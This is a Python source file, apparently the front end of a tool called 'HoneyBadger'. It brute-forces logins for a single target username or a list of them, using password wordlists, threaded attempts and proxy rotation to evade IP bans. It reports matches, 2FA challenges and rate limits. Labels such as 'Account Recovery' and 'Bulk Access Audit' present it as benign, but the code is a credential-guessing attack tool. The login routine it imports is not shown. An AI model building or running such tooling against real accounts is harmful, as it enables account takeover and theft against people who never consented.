import os
import sys
import time
from concurrent.futures import ThreadPoolExecutor
from src.utils.ui import (
    Theme, 
    print_header, 
    print_status, 
    print_summary, 
    print_separator, 
    print_centered_status,
    print_centered,
    get_terminal_width
)
from src.core.attack import attempt_login

def get_input(prompt):
    print("")
    try:
        return input(f"  {Theme.PRIMARY}>>{Theme.RESET} {prompt}: ").strip()
    except EOFError:
        return ""
    except KeyboardInterrupt:
        raise KeyboardInterrupt

def load_dataset(filename_prompt):
    while True:
        path = get_input(filename_prompt + " (or 'b' to back)")
        if path.lower() == 'b': return None
        if not path: continue 

        # Auto-resolve
        if not os.path.exists(path):
            alt_path = os.path.join("data", path)
            if os.path.exists(alt_path):
                path = alt_path

        if not os.path.exists(path):
            print_status(f"File not found: {path}", "FAIL")
            continue
            
        try:
            with open(path, 'r', encoding='utf-8') as f:
                data = [line.strip() for line in f if line.strip()]
            print_status(f"Loaded {len(data)} entries.", "OK")
            return data
        except Exception:
            print_status("Error reading dataset", "FAIL")
            continue

def execute_audit(usernames, passwords, proxies):
    print_separator()
    print_centered_status("Initializing HoneyBadger Engine...", Theme.WARNING)
    
    start_time = time.time()
    max_workers = min(len(proxies), 10) if proxies else 1
    
    tasks = []
    task_idx = 0
    
    for user in usernames:
        for pwd in passwords:
            proxy = proxies[task_idx % len(proxies)] if proxies else None
            tasks.append((user, pwd, proxy))
            task_idx += 1

    print("\n")
    print_status(f"Starting audit on {len(tasks)} targets...", "BUSY")
    
    success_count = 0
    
    # Initialize Executor
    executor = ThreadPoolExecutor(max_workers=max_workers)
    
    try:
        # We process futures as they complete to print results LIVE
        futures = [executor.submit(attempt_login, t[0], t[1], t[2]) for t in tasks]
        
        for future, task in zip(futures, tasks):
            result = future.result()
            user, pwd, _ = task
            
            # Live Output Logic
            if result == "SUCCESS":
                print(f"  {Theme.SUCCESS}[✓] MATCH FOUND: {user} | {pwd}{Theme.RESET}")
                success_count += 1
            elif result == "WRONG_PASS":
                # Print failed attempts in muted color for feedback
                # Use \r to overwrite line if you want cleaner look, or print to show volume
                # For robustness, we print detailed log
                print(f"  {Theme.MUTED}[x] Failed: {user} | {pwd}{Theme.RESET}") 
            elif result == "CHALLENGE":
                print(f"  {Theme.WARNING}[!] CHALLENGE: {user} (2FA/Checkpoint){Theme.RESET}")
            elif result == "BLOCKED":
                print(f"  {Theme.ERROR}[!] BLOCKED: {user} (IP/Action Ban){Theme.RESET}")
            elif result == "RATELIMIT":
                print(f"  {Theme.ERROR}[!] RATE LIMIT: {user} (Slowing down){Theme.RESET}")

    except KeyboardInterrupt:
        print("\n")
        print_centered_status("Stopping Audit... (Ctrl+C Detected)", Theme.ERROR)
        executor.shutdown(wait=False, cancel_futures=True)
        return

    executor.shutdown(wait=False)
    
    duration = time.time() - start_time
    print_summary(success_count, len(tasks), duration)
    input(f"\n  {Theme.MUTED}Press Enter to return to menu...{Theme.RESET}")

def main():
    while True:
        try:
            print_header()
            
            print(f"  {Theme.PRIMARY}SELECT OPERATION MODULE{Theme.RESET}")
            print("  1. Single Account Recovery")
            print("  2. Bulk Access Audit")
            print("  3. Exit System")
            print("")
            
            choice = get_input("Selection")
            
            if not choice:
                continue

            if choice == '1':
                print_separator()
                target = get_input("Enter Target Username")
                if not target: continue
                
                passwords = load_dataset("Password Wordlist")
                if passwords is None: continue 
                
                proxies = []
                if get_input("Enable Proxy Rotation? (y/n)").lower() == 'y':
                    proxies = load_dataset("Proxy List")
                    if proxies is None: proxies = []

                execute_audit([target], passwords, proxies)

            elif choice == '2':
                print_separator()
                usernames = load_dataset("Username List")
                if usernames is None: continue
                
                passwords = load_dataset("Password Wordlist")
                if passwords is None: continue
                
                proxies = load_dataset("Proxy List")
                if proxies is None: proxies = [] 
                
                execute_audit(usernames, passwords, proxies)

            elif choice == '3':
                print_centered_status("Shutting down...", Theme.MUTED)
                sys.exit(0)
            else:
                print_status("Invalid Selection", "FAIL")
                time.sleep(1)
        
        except KeyboardInterrupt:
            print("\n")
            print_centered_status("Terminating HoneyBadger session...", Theme.ERROR)
            sys.exit(0)
        except Exception as e:
            print_status(f"System Error: {e}", "FAIL")
            time.sleep(2)
            continue
